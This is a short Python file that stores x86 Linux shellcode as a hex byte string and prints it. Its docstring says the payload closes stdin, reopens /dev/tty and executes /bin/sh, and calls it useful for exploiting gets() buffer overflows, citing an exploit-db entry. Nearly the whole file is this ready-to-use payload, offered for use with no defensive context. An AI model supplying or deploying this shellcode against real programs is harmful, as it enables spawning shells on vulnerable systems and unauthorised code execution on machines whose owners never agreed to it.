"""
Local shellcode for stdin re-open and /bin/sh exec. It closes stdin
descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
Useful to exploit some gets() buffer overflows in an elegant way...

http://www.exploit-db.com/exploits/13357/
"""

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

if __name__ == "__main__":
    print(shellcode)
